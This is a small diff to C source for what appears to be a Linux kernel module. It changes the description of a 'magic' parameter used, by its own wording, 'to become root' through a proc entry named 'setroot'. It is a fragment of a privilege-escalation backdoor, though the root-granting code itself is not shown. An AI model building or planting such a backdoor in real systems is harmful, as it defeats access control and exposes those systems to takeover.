@@ -25,7 +25,7 @@ static inline uid_t from_kuid(struct user_namespace *to, uid_t uid)
 
 static char *magic = "magic";
 module_param(magic, charp, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
-MODULE_PARM_DESC(magic, "A magic number to become root");
+MODULE_PARM_DESC(magic, "A magic string to become root");
 
 static char *procname = "setroot";
 module_param(procname, charp, S_IRUSR | S_IRGRP | S_IROTH);
